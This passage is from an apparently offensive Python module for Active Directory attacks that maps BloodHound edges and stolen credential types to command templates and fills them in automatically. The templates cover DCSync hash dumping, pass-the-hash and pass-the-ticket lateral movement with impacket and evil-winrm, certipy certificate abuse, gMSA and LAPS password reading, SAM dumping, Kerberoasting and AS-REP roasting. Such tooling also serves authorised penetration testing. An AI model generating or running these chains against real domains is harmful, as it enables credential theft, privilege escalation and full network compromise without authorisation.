        "context": "AddAllowedToAct - configure RBCD",
        "permissions_required": "AddAllowedToAct extended right on target",
    },
    "privesc-dcsync-composite": {
        "commands": ["ad-dcsync-impacket-secretsdump-user"],
        "access_type": "DCSync",
        "user_field": "DCSync_Principal",
        "target_field": "Domain",
        "domain_level": True,
        "context": "Full DCSync rights (GetChanges+GetChangesAll)",
        "permissions_required": "GetChanges + GetChangesAll on domain object",
    },

    # ==================== QUICK WINS (NEW) ====================
    "quick-gmsa-password": {
        "commands": ["gmsadumper", "bloodyad-gmsa"],
        "access_type": "ReadGMSAPassword",
        "user_field": "Attacker",
        "target_field": "GMSAAccount",
        "context": "Read gMSA password - cleartext credential",
        "permissions_required": "In PrincipalsAllowedToRetrieveManagedPassword",
        "post_success": [
            {"description": "Use gMSA credentials", "command": "crackmapexec smb <TARGET> -u '<GMSA_NAME>$' -p '<GMSA_PASSWORD>'"},
            {"description": "Check gMSA access", "command": "bloodtrail --run-query owned-what-can-access --var USER=<GMSA_NAME>$@<DOMAIN>"},
            {"description": "gMSA often has elevated privileges", "command": None},
        ],
    },
    "quick-laps-readers": {
        "commands": ["laps-password-cme", "laps-password-ldapsearch"],
        "access_type": "ReadLAPSPassword",
        "user_field": "Attacker",
        "array_field": "Computers",
        "context": "Read LAPS password - local admin creds",
        "permissions_required": "Read access to ms-mcs-AdmPwd attribute",
        "post_success": [
            {"description": "Read LAPS password", "command": "crackmapexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -M laps"},
            {"description": "Use local admin creds", "command": "crackmapexec smb <TARGET> -u 'Administrator' -p '<LAPS_PASSWORD>' --local-auth"},
            {"description": "Dump creds from target", "command": "crackmapexec smb <TARGET> -u 'Administrator' -p '<LAPS_PASSWORD>' --local-auth --sam"},
        ],
    },
    "quick-gmsa-all": {
        "commands": ["gmsadumper"],
        "access_type": None,
        "target_field": "GMSAAccount",
        "context": "gMSA enumeration",
        "discovery_command": True,
        "permissions_required": "Any authenticated domain user (enumeration only)",
    },
}


# =============================================================================
# CREDENTIAL TYPE -> COMMAND MAPPINGS (for pwned user follow-up)
# =============================================================================

# Maps credential type + access type to appropriate command IDs
# Used by pwned_tracker to generate copy-paste ready commands

CRED_TYPE_COMMANDS: Dict[str, Dict[str, List[str]]] = {
    "password": {
        "AdminTo": ["impacket-psexec", "impacket-wmiexec", "impacket-smbexec"],
        "CanRDP": ["xfreerdp-connect"],
        "CanPSRemote": ["evil-winrm-shell"],
        "ExecuteDCOM": ["impacket-wmiexec"],
        "DCSync": ["ad-dcsync-impacket-secretsdump-user"],
    },
    "ntlm-hash": {
        "AdminTo": ["psexec-pth", "wmiexec-pth", "smbexec-pth"],
        "CanRDP": ["xfreerdp-pth"],
        "CanPSRemote": ["evil-winrm-hash"],
        "ExecuteDCOM": ["wmiexec-pth"],
        "DCSync": ["ad-dcsync-impacket-secretsdump-hash"],
    },
    "kerberos-ticket": {
        "AdminTo": ["psexec-kerberos", "wmiexec-kerberos"],
        "CanRDP": ["xfreerdp-kerberos"],
        "CanPSRemote": ["evil-winrm-kerberos"],
        "ExecuteDCOM": ["wmiexec-kerberos"],
        "DCSync": ["ad-dcsync-impacket-secretsdump-kerberos"],
    },
    "certificate": {
        "AdminTo": ["certipy-auth-pth"],
        "CanRDP": ["certipy-auth-rdp"],
        "CanPSRemote": ["certipy-auth-winrm"],
        "DCSync": ["certipy-auth-dcsync"],
    },
}


# Command templates by credential type (with auto-fill placeholders)
# These are the actual command strings with credential placeholders filled
CRED_TYPE_TEMPLATES: Dict[str, Dict[str, str]] = {
    "password": {
        "AdminTo": "impacket-psexec '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
        "CanRDP": "xfreerdp /v:<TARGET> /u:<USERNAME> /p:'<CRED_VALUE>' /d:<DOMAIN>",
        "CanPSRemote": "evil-winrm -i <TARGET> -u <USERNAME> -p '<CRED_VALUE>'",
        "DCSync": "impacket-secretsdump '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<DC_IP>",
        "secretsdump": "impacket-secretsdump '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
    },
    "ntlm-hash": {
        "AdminTo": "impacket-psexec -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
        "CanRDP": "xfreerdp /v:<TARGET> /u:<USERNAME> /pth:<CRED_VALUE> /d:<DOMAIN>",
        "CanPSRemote": "evil-winrm -i <TARGET> -u <USERNAME> -H <CRED_VALUE>",
        "DCSync": "impacket-secretsdump -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<DC_IP>",
        "secretsdump": "impacket-secretsdump -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
    },
    "kerberos-ticket": {
        "AdminTo": "KRB5CCNAME=<CRED_VALUE> impacket-psexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
        "CanRDP": "xfreerdp /v:<TARGET> /u:<USERNAME> /d:<DOMAIN> /kerberos",
        "CanPSRemote": "KRB5CCNAME=<CRED_VALUE> evil-winrm -i <TARGET> -r <DOMAIN>",
        "DCSync": "KRB5CCNAME=<CRED_VALUE> impacket-secretsdump -k -no-pass '<DOMAIN>/<USERNAME>'@<DC_IP>",
        "secretsdump": "KRB5CCNAME=<CRED_VALUE> impacket-secretsdump -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
    },
    "certificate": {
        "AdminTo": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && impacket-psexec -hashes :<NTLM> '<DOMAIN>/<USERNAME>'@<TARGET>",
        "CanRDP": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && xfreerdp /v:<TARGET> /u:<USERNAME> /pth:<NTLM>",
        "CanPSRemote": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && evil-winrm -i <TARGET> -u <USERNAME> -H <NTLM>",
        "DCSync": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && impacket-secretsdump -hashes :<NTLM> '<DOMAIN>/<USERNAME>'@<DC_IP>",
    },
}


def get_commands_for_cred_type(cred_type: str, access_type: str) -> List[str]:
    """
    Get command IDs for a credential type and access type combination.

    Args:
        cred_type: password, ntlm-hash, kerberos-ticket, certificate
        access_type: AdminTo, CanRDP, CanPSRemote, etc.

    Returns:
        List of command IDs
    """
    return CRED_TYPE_COMMANDS.get(cred_type, {}).get(access_type, [])


def get_command_template(cred_type: str, access_type: str) -> Optional[str]:
    """
    Get ready-to-fill command template for credential type and access type.

    Args:
        cred_type: password, ntlm-hash, kerberos-ticket, certificate
        access_type: AdminTo, CanRDP, CanPSRemote, etc.

    Returns:
        Command template string with placeholders
    """
    return CRED_TYPE_TEMPLATES.get(cred_type, {}).get(access_type)


def fill_command(
    template: str,
    username: str = "",
    target: str = "",
    domain: str = "",
    dc_ip: str = "",
    password: str = "",
    ntlm_hash: str = "",
    cred_value: str = "",
) -> str:
    """
    Universal command placeholder filler.

    Fills all standard placeholders plus optional credentials.
    Credentials only fill if non-empty string provided.

    Args:
        template: Command template with <PLACEHOLDERS>
        username: Username (UPN format OK - will extract just username)
        target: Target computer FQDN
        domain: Domain name
        dc_ip: Domain controller IP/hostname (auto-inferred if not provided)
        password: Password credential (fills <PASSWORD>)
        ntlm_hash: NTLM hash credential (fills <HASH>, <NTLM_HASH>)
        cred_value: Generic credential value (fills <CRED_VALUE>)

    Returns:
        Filled command string
    """
    result = template

    # === User placeholders ===
    if username:
        # Handle UPN format (MIKE@CORP.COM -> MIKE)
        clean_user = extract_username(username) if "@" in username else username
        result = result.replace("<USERNAME>", clean_user)
        result = result.replace("<USER>", clean_user)

    # === Target placeholders ===
    if target:
        result = result.replace("<TARGET>", target)
        result = result.replace("<COMPUTER>", target)

    # === Domain placeholders ===
    if domain:
        result = result.replace("<DOMAIN>", domain.lower())

    # === DC placeholders ===
    dc = dc_ip or (infer_dc_hostname(domain) if domain else "")
    if dc:
        result = result.replace("<DC_IP>", dc)
        result = result.replace("<DC>", dc)

    # === Credential placeholders (only if provided) ===
    if password:
        result = result.replace("<PASSWORD>", password)

    if ntlm_hash:
        result = result.replace("<HASH>", ntlm_hash)
        result = result.replace("<NTLM_HASH>", ntlm_hash)

    if cred_value:
        result = result.replace("<CRED_VALUE>", cred_value)

    return result


def fill_pwned_command(
    template: str,
    username: str,
    domain: str,
    target: str,
    cred_value: str,
    dc_ip: Optional[str] = None
) -> str:
    """
    Fill a command template with pwned user credentials.

    DEPRECATED: Use fill_command() instead for new code.
    This function is kept for backward compatibility.
    """
    return fill_command(
        template=template,
        username=username,
        domain=domain,
        target=target,
        dc_ip=dc_ip or "",
        cred_value=cred_value,
    )


# =============================================================================
# EDGE TYPE -> COMMAND MAPPINGS (for attack sequence building)
# =============================================================================

EDGE_COMMAND_MAPPINGS: Dict[str, List[str]] = {
    # Access Edges
    "AdminTo": ["impacket-psexec", "impacket-wmiexec", "impacket-smbexec"],
    "CanRDP": ["xfreerdp-connect"],
    "CanPSRemote": ["evil-winrm-shell"],
    "ExecuteDCOM": ["impacket-wmiexec"],
    "HasSession": ["impacket-psexec"],  # Get shell to harvest creds

    # Permission Edges (ACL abuse)
    # Note: bloodyad-genericall, dacledit, owneredit, net-group-add not yet in DB
    # Using available alternatives until dedicated ACL commands are added
    "GenericAll": ["crackmapexec-smb-spray"],  # Reset password then spray
    "GenericWrite": ["impacket-getuserspns-kerberoast"],  # Add SPN then kerberoast
    "WriteDacl": [],  # TODO: add dacledit command
    "WriteOwner": [],  # TODO: add owneredit command
    "ForceChangePassword": ["crackmapexec-smb-spray"],  # Spray with new password
    "AddMember": [],  # TODO: add net-group-add command
    "Owns": ["crackmapexec-smb-spray"],  # Full control - reset password

    # Privilege Edges
    "GetChanges": ["ad-dcsync-impacket-secretsdump-user"],
    "GetChangesAll": ["ad-dcsync-impacket-secretsdump-user"],
    "AllExtendedRights": ["ad-dcsync-impacket-secretsdump-user"],

    # Credential Edges
    "ReadGMSAPassword": ["gmsadumper", "bloodyad-gmsa"],
    "ReadLAPSPassword": ["laps-password-cme", "laps-password-ldapsearch"],
    "AddKeyCredentialLink": ["certipy-shadow"],  # TODO: add pywhisker command
    "SyncLAPSPassword": ["laps-password-cme", "laps-password-ldapsearch"],

    # Delegation Edges
    "AllowedToDelegate": ["rubeus-s4u-impersonate", "impacket-getST-constrained"],
    "AllowedToAct": ["rbcd-getST", "rubeus-s4u-impersonate"],
    "AddAllowedToAct": ["rbcd-set-msds"],
    "WriteAccountRestrictions": ["rbcd-set-msds", "bloodyad-rbcd"],

    # ADCS Edges (Certificate Services)
    "ADCSESC1": ["certipy-req-esc1"],
    "ADCSESC3": ["certipy-req-esc1"],
    "ADCSESC4": ["certipy-req-esc4"],
    "ADCSESC5": ["certipy-find"],
    "ADCSESC6a": ["certipy-req-esc1"],
    "ADCSESC6b": ["certipy-req-esc1"],
    "ADCSESC7": ["certipy-req-esc7"],
    "ADCSESC9a": ["certipy-req-esc1", "certipy-auth"],
    "ADCSESC9b": ["certipy-req-esc1", "certipy-auth"],
    "ADCSESC10a": ["certipy-req-esc1", "certipy-auth"],
    "ADCSESC10b": ["certipy-shadow"],
    "ADCSESC13": ["certipy-req-esc1"],
    "GoldenCert": ["certipy-forge"],
    "Enroll": ["certipy-req-esc1", "certify-request"],
    "EnrollOnBehalfOf": ["certipy-req-esc1"],
    "ManageCA": ["certipy-req-esc7"],
    "ManageCertificates": ["certipy-req-esc7"],

    # Coercion Edges
    "CoerceToTGT": ["petitpotam-coerce", "coercer-coerce", "printerbug-trigger", "dfscoerce-trigger"],

    # SID/Trust Edges
    "HasSIDHistory": ["impacket-psexec", "impacket-wmiexec"],
    "TrustedBy": ["impacket-psexec"],

    # Other PrivEsc Edges
    "WriteSPN": ["impacket-getuserspns-kerberoast"],

    # Membership (informational)
    "MemberOf": [],
}


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def extract_domain(upn: str) -> str:
    """Extract domain from UPN format. MIKE@CORP.COM -> CORP.COM"""
    if "@" in upn:
        return upn.split("@")[1]
    return ""


def extract_username(upn: str) -> str:
    """Extract username from UPN format. MIKE@CORP.COM -> MIKE"""
    if "@" in upn:
        return upn.split("@")[0]
    return upn


def infer_dc_hostname(domain: str) -> str:
    """
    Infer DC hostname from domain name.
    CORP.COM -> DC01.CORP.COM (common pattern)

    Note: This is best-effort. User may need to adjust for non-standard DC names.
    """
    if not domain:
        return "<DC_IP>"
    # Try common DC naming patterns
    return f"DC01.{domain}"


# =============================================================================
# GROUP NAME DETECTION (for filtering invalid targets)
# =============================================================================

# Common AD group patterns that should NOT be used as computer targets
GROUP_NAME_PATTERNS = [
    "DOMAIN CONTROLLERS",
    "DOMAIN ADMINS",
    "ENTERPRISE ADMINS",
    "ADMINISTRATORS",
    "SCHEMA ADMINS",
    "DNSADMINS",
    "CLONEABLE DOMAIN CONTROLLERS",
    "ENTERPRISE READ-ONLY DOMAIN CONTROLLERS",
    "PROTECTED USERS",
    "KEY ADMINS",
    "ENTERPRISE KEY ADMINS",
    "CERT PUBLISHERS",
    "RAS AND IAS SERVERS",
    "ALLOWED RODC PASSWORD REPLICATION GROUP",
    "DENIED RODC PASSWORD REPLICATION GROUP",
    "READ-ONLY DOMAIN CONTROLLERS",
    "GROUP POLICY CREATOR OWNERS",
    "DOMAIN COMPUTERS",
    "DOMAIN GUESTS",
    "DOMAIN USERS",
    "ACCOUNT OPERATORS",
    "SERVER OPERATORS",
    "PRINT OPERATORS",
    "BACKUP OPERATORS",
    "REPLICATOR",
]


def is_group_name(name: str) -> bool:
    """
    Detect if a name is a group (not a valid computer target).

    Groups like "DOMAIN CONTROLLERS@CORP.COM" should not be used
    as <TARGET> in attack commands.
    """
    if not name:
        return False
    upper = name.upper()
    # Check against known patterns
    for pattern in GROUP_NAME_PATTERNS:
        if pattern in upper:
            return True
    return False


# =============================================================================
# SENSITIVE PLACEHOLDERS (never auto-fill)
# =============================================================================

SENSITIVE_PLACEHOLDERS = {
    "<PASSWORD>",
    "<HASH>",
    "<NTLM_HASH>",
    "<LM_HASH>",
    "<TICKET>",
    "<PRIVATE_KEY>",
    "<TARGET_USER>",  # User to DCSync - needs manual selection
}


# =============================================================================
# ACCESS TYPE -> REWARDS MAPPING (practical value of exploiting this access)
# =============================================================================

ACCESS_TYPE_REWARDS: Dict[Optional[str], str] = {
    # Lateral Movement rewards
    "AdminTo": "SYSTEM shell for credential dumping, persistence, and pivoting",
    "CanRDP": "Interactive desktop access for GUI tools and credential theft",
    "CanPSRemote": "PowerShell remoting for stealthy command execution",
    "ExecuteDCOM": "Remote code execution via DCOM for lateral movement",
    "HasSession": "Harvest cached credentials from logged-in privileged user",
    "CoerceToTGT": "Capture TGT for pass-the-ticket attacks",
    "HasSIDHistory": "Inherited permissions from historical SID membership",
    "TrustedBy": "Cross-domain access via trust relationship",

    # Delegation rewards
    "AllowedToDelegate": "Impersonate any user to target service via S4U",
    "AllowedToAct": "Impersonate users via RBCD for privileged access",
    "AddAllowedToAct": "Configure RBCD to enable user impersonation",
    "WriteAccountRestrictions": "Modify RBCD settings for delegation abuse",

    # Privilege Escalation rewards
    "DCSync": "Dump all domain password hashes including krbtgt",
    "GenericAll": "Full control - reset passwords, modify group membership",
    "GenericWrite": "Add SPN for Kerberoasting or modify attributes",
    "WriteDacl": "Grant yourself additional permissions on object",
    "WriteOwner": "Take ownership then modify DACL for full control",
    "ForceChangePassword": "Reset user password without knowing current",
    "AddMember": "Add yourself to privileged groups",
    "ReadGMSAPassword": "Retrieve cleartext gMSA password for authentication",
    "ReadLAPSPassword": "Retrieve local admin password from LAPS",
    "SyncLAPSPassword": "Domain-wide LAPS password retrieval",
    "AddKeyCredentialLink": "Add shadow credentials for certificate-based auth",
    "WriteSPN": "Add SPN for targeted Kerberoasting attack",
    "Owns": "Full object control - reset password or modify permissions",

    # ADCS rewards
    "ADCSESC1": "Request certificate as any user for domain admin access",
    "ADCSESC3": "Enrollment agent abuse for user impersonation",
    "ADCSESC4": "Modify template to enable ESC1 vulnerability",
    "ADCSESC5": "PKI object modification for certificate abuse",
    "ADCSESC6a": "Request cert with arbitrary SAN for impersonation",
    "ADCSESC6b": "Bypass issuance requirements for unauthorized certs",
    "ADCSESC7": "Approve pending certificate requests as CA manager",
    "ADCSESC9a": "Bypass security extension for certificate abuse",
    "ADCSESC9b": "Exploit weak certificate mapping for impersonation",
    "ADCSESC10a": "Exploit weak cert binding for authentication",
    "ADCSESC10b": "Shadow credentials via ADCS for persistent access",
    "ADCSESC13": "OID group link for privilege escalation",
    "GoldenCert": "Forge any certificate with compromised CA key",
    "Enroll": "Request certificates for authentication",
    "EnrollOnBehalfOf": "Request certificates impersonating other users",
    "ManageCA": "CA management for certificate manipulation",
    "ManageCertificates": "Approve/deny certificate requests",

    # Default
    None: "Potential attack vector identified",
}


# =============================================================================
# ACCESS TYPE -> PHASE MAPPING (for output grouping)
# =============================================================================

ACCESS_TYPE_PHASES = {
    # Quick Wins
    None: "Quick Wins",

    # Lateral Movement
    "AdminTo": "Lateral Movement",
    "CanRDP": "Lateral Movement",
    "CanPSRemote": "Lateral Movement",
    "ExecuteDCOM": "Lateral Movement",
    "HasSession": "Lateral Movement",
    "CoerceToTGT": "Lateral Movement",
    "HasSIDHistory": "Lateral Movement",
    "TrustedBy": "Lateral Movement",

    # Delegation (Lateral Movement)
    "AllowedToDelegate": "Lateral Movement",
    "AllowedToAct": "Lateral Movement",
    "AddAllowedToAct": "Lateral Movement",
    "WriteAccountRestrictions": "Lateral Movement",

    # Privilege Escalation
    "DCSync": "Privilege Escalation",
    "GenericAll": "Privilege Escalation",
    "GenericWrite": "Privilege Escalation",
    "WriteDacl": "Privilege Escalation",
    "WriteOwner": "Privilege Escalation",
    "ForceChangePassword": "Privilege Escalation",
    "AddMember": "Privilege Escalation",
    "ReadGMSAPassword": "Privilege Escalation",
    "ReadLAPSPassword": "Privilege Escalation",
    "SyncLAPSPassword": "Privilege Escalation",
    "AddKeyCredentialLink": "Privilege Escalation",
    "WriteSPN": "Privilege Escalation",
    "Owns": "Privilege Escalation",

    # ADCS (Privilege Escalation)
    "ADCSESC1": "Privilege Escalation",
    "ADCSESC3": "Privilege Escalation",
    "ADCSESC4": "Privilege Escalation",
    "ADCSESC5": "Privilege Escalation",
    "ADCSESC6a": "Privilege Escalation",
    "ADCSESC6b": "Privilege Escalation",
    "ADCSESC7": "Privilege Escalation",
    "ADCSESC9a": "Privilege Escalation",
    "ADCSESC9b": "Privilege Escalation",
    "ADCSESC10a": "Privilege Escalation",
    "ADCSESC10b": "Privilege Escalation",
    "ADCSESC13": "Privilege Escalation",
    "GoldenCert": "Privilege Escalation",
    "Enroll": "Privilege Escalation",
    "EnrollOnBehalfOf": "Privilege Escalation",
    "ManageCA": "Privilege Escalation",
    "ManageCertificates": "Privilege Escalation",
}


# =============================================================================
# ACCESS TYPE -> REASON TEMPLATES (for command suggestion justification)
# =============================================================================

# Templates use {user} and {target} placeholders for dynamic reason generation
ACCESS_TYPE_REASONS: Dict[Optional[str], str] = {
    # Lateral Movement reasons
    "AdminTo": "{user} has local admin rights on {target}",
    "CanRDP": "{user} has RDP access to {target}",
    "CanPSRemote": "{user} has PSRemote/WinRM access to {target}",
    "ExecuteDCOM": "{user} can execute DCOM on {target}",
    "HasSession": "Privileged session active on {target} - credential harvest",
    "CoerceToTGT": "{user} can coerce {target} auth to capture TGT",
    "HasSIDHistory": "{user} has SID history granting access to {target}",
    "TrustedBy": "{target} trusts {user}'s domain",

    # Delegation reasons
    "AllowedToDelegate": "{user} has constrained delegation to {target}",
    "AllowedToAct": "{user} can impersonate users to {target} via RBCD",
    "AddAllowedToAct": "{user} can add RBCD principals to {target}",
    "WriteAccountRestrictions": "{user} can configure RBCD on {target}",

    # Privilege Escalation reasons
    "DCSync": "{user} has DCSync rights (GetChanges+GetChangesAll)",
    "GenericAll": "{user} has GenericAll over {target}",
    "GenericWrite": "{user} has GenericWrite on {target}",
    "WriteDacl": "{user} can modify DACL on {target}",
    "WriteOwner": "{user} can take ownership of {target}",
    "ForceChangePassword": "{user} can reset password for {target}",
    "AddMember": "{user} can add members to {target}",
    "ReadGMSAPassword": "{user} can read gMSA password for {target}",
    "ReadLAPSPassword": "{user} can read LAPS password on {target}",
    "SyncLAPSPassword": "{user} has domain-wide LAPS sync rights",
    "AddKeyCredentialLink": "{user} can add shadow credentials to {target}",
    "WriteSPN": "{user} can add SPN to {target} for targeted Kerberoasting",
    "Owns": "{user} owns {target} - full control",

    # ADCS reasons
    "ADCSESC1": "{user} can request cert as any user via {target}",
    "ADCSESC3": "{user} can enroll on behalf of others via {target}",
    "ADCSESC4": "{user} can modify template {target} for ESC1",
    "ADCSESC5": "{user} can modify PKI object {target}",
    "ADCSESC6a": "{user} can exploit EDITF_ATTRIBUTESUBJECTALTNAME2 on {target}",
    "ADCSESC6b": "{user} can bypass issuance requirements on {target}",
    "ADCSESC7": "{user} can manage CA {target} - approve pending requests",
    "ADCSESC9a": "{user} can exploit no security extension on {target}",
    "ADCSESC9b": "{user} can exploit weak certificate mapping on {target}",
    "ADCSESC10a": "{user} can exploit weak cert binding on {target}",
    "ADCSESC10b": "{user} can add shadow credentials via {target}",
    "ADCSESC13": "{user} can exploit OID group link on {target}",
    "GoldenCert": "CA {target} key compromised - forge any certificate",
    "Enroll": "{user} can enroll in template {target}",
    "EnrollOnBehalfOf": "{user} can enroll certificates on behalf of others",
    "ManageCA": "{user} can manage CA {target}",
    "ManageCertificates": "{user} can approve certificate requests on {target}",

    # Quick Wins - no access_type (None)
    None: "",  # Will use context-based reason instead
}


def get_reason(
    access_type: Optional[str],
    user: str,
    target: str,
    context: str = ""
) -> str:
    """
    Generate human-readable reason for command suggestion.

    Args:
        access_type: BloodHound edge type (AdminTo, CanRDP, etc.)
        user: User principal with access
        target: Target computer or user
        context: Additional context from query mapping

    Returns:
        Human-readable reason string
    """
    # Try access_type template first
    template = ACCESS_TYPE_REASONS.get(access_type, "")

    if template:
        # Format with user/target, handling missing values
        user_short = extract_username(user) if user else "User"
        target_short = target.split(".")[0] if target else "target"
        return template.format(user=user_short, target=target_short)

    # Fall back to context if no access_type reason
    if context:
        return context

    # Generic fallback
    if access_type:
        return f"{access_type} relationship"

    return "BloodHound finding"


# =============================================================================
# AUTHENTICATED USER ATTACKS (any domain user can run)
# =============================================================================

# Templates for attacks that ANY authenticated domain user can run
# These don't require specific BloodHound edges - just valid domain creds
AUTHENTICATED_USER_TEMPLATES: Dict[str, Dict[str, str]] = {
    "password": {
        # Credential Attacks (High Priority)
        "asrep-roast": "impacket-GetNPUsers '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request",
        "kerberoast": "impacket-GetUserSPNs '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request",
        # BloodHound Collection
        "bloodhound": "bloodhound-python -c all -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <DC_IP>",
        # User/Group Enumeration
        "enum-users": "crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --users",
        "enum-groups": "crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M groupmembership -o GROUP='Domain Admins'",
        # Share/Resource Enumeration
        "enum-shares": "crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --shares",
        "enum-computers": "crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --computers",
        # Policy/Config Enumeration
        "enum-passpol": "crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --pass-pol",
        "enum-gpos": "crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_gpo",
        "enum-trusts": "crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_trusts",
    },
    "ntlm-hash": {
        "asrep-roast": "impacket-GetNPUsers '<DOMAIN>/<USERNAME>' -hashes :<NTLM_HASH> -dc-ip <DC_IP> -request",
        "kerberoast": "impacket-GetUserSPNs '<DOMAIN>/<USERNAME>' -hashes :<NTLM_HASH> -dc-ip <DC_IP> -request",
        "bloodhound": "bloodhound-python -c all -u <USERNAME> --hashes :<NTLM_HASH> -d <DOMAIN> -dc <DC_IP>",
        "enum-users": "crackmapexec smb <DC_IP> -u <USERNAME> -H <NTLM_HASH> --users",
        "enum-shares": "crackmapexec smb <DC_IP> -u <USERNAME> -H <NTLM_HASH> --shares",
        "enum-computers": "crackmapexec smb <DC_IP> -u <USERNAME> -H <NTLM_HASH> --computers",
        "enum-passpol": "crackmapexec smb <DC_IP> -u <USERNAME> -H <NTLM_HASH> --pass-pol",
    },
    "kerberos-ticket": {
        "asrep-roast": "KRB5CCNAME=<CCACHE_FILE> impacket-GetNPUsers '<DOMAIN>/<USERNAME>' -k -no-pass -dc-ip <DC_IP>",
        "kerberoast": "KRB5CCNAME=<CCACHE_FILE> impacket-GetUserSPNs '<DOMAIN>/<USERNAME>' -k -no-pass -dc-ip <DC_IP> -request",
        "bloodhound": "KRB5CCNAME=<CCACHE_FILE> bloodhound-python -c all -u <USERNAME> -k -d <DOMAIN> -dc <DC_IP>",
    },
}

# Attack metadata for display (organized by priority and category)
AUTHENTICATED_ATTACKS: List[Dict[str, str]] = [
    # === CREDENTIAL ATTACKS (High Priority) ===
    {
        "id": "asrep-roast",
        "name": "AS-REP Roasting",
        "category": "Credential Attacks",
        "objective": "Find users with DONT_REQUIRE_PREAUTH, get crackable hash",
        "rewards": "Credentials of AS-REP roastable users",
        "requires": "Any authenticated domain user",
        "priority": "high",
    },
    {
        "id": "kerberoast",
        "name": "Kerberoasting",
        "category": "Credential Attacks",
        "objective": "Get TGS tickets for service accounts, crack offline",
        "rewards": "Service account credentials (often privileged)",
        "requires": "Any authenticated domain user",
        "priority": "high",
    },
    # === BLOODHOUND (Recommended) ===
    {
        "id": "bloodhound",
        "name": "BloodHound Collection",
        "category": "Graph Collection",
        "objective": "Collect domain data for attack path analysis",
        "rewards": "Complete attack path visualization, missed edges",
        "requires": "Any authenticated domain user",
        "priority": "high",
    },
    # === USER/GROUP ENUMERATION ===
    {
        "id": "enum-users",
        "name": "Domain User Enumeration",
        "category": "User Enumeration",
        "objective": "Enumerate all domain users for targeting",
        "rewards": "User list for password spraying, pattern analysis",
        "requires": "Any authenticated domain user",
        "priority": "medium",
    },
    {
        "id": "enum-groups",
        "name": "Domain Admins Members",
        "category": "User Enumeration",
        "objective": "Identify Domain Admin group members",
        "rewards": "High-value targets for credential attacks",
        "requires": "Any authenticated domain user",
        "priority": "medium",
    },
    # === RESOURCE ENUMERATION ===
    {
        "id": "enum-shares",
        "name": "Share Enumeration",
        "category": "Resource Enumeration",
        "objective": "Enumerate accessible SMB shares",
        "rewards": "Sensitive files, credentials, configuration data",
        "requires": "Any authenticated domain user",
        "priority": "medium",
    },
    {
        "id": "enum-computers",
        "name": "Computer Enumeration",
        "category": "Resource Enumeration",
        "objective": "List domain computers for lateral movement targets",
        "rewards": "Target list for lateral movement, version info",
        "requires": "Any authenticated domain user",
        "priority": "medium",
    },
    # === POLICY ENUMERATION ===
    {
        "id": "enum-passpol",
        "name": "Password Policy",
        "category": "Policy Enumeration",
        "objective": "Get password policy for spray planning",
        "rewards": "Lockout threshold, complexity, spray parameters",
        "requires": "Any authenticated domain user",
        "priority": "medium",
    },
    {
        "id": "enum-trusts",
        "name": "Domain Trust Enumeration",
        "category": "Policy Enumeration",
        "objective": "Discover domain trusts for cross-domain attacks",
        "rewards": "Trust relationships, potential lateral paths",
        "requires": "Any authenticated domain user",
        "priority": "low",
    },
    {
        "id": "enum-gpos",
        "name": "GPO Enumeration",
        "category": "Policy Enumeration",
        "objective": "Enumerate Group Policy Objects",
        "rewards": "GPO misconfigs, deployed software, privilege settings",
        "requires": "Any authenticated domain user",
        "priority": "low",
    },
]


def get_authenticated_attack_template(cred_type: str, attack_id: str) -> Optional[str]:
    """
    Get command template for an authenticated user attack.

    Args:
        cred_type: password, ntlm-hash, kerberos-ticket
        attack_id: Attack ID from AUTHENTICATED_ATTACKS

    Returns:
        Command template string or None if not available
    """
    return AUTHENTICATED_USER_TEMPLATES.get(cred_type, {}).get(attack_id)


def get_authenticated_attacks(priority: Optional[str] = None) -> List[Dict[str, str]]:
    """
    Get list of authenticated user attack metadata.

    Args:
        priority: Filter by priority (high, medium, low) or None for all

    Returns:
        List of attack metadata dicts
    """
    if priority is None:
        return AUTHENTICATED_ATTACKS
    return [a for a in AUTHENTICATED_ATTACKS if a.get("priority") == priority]
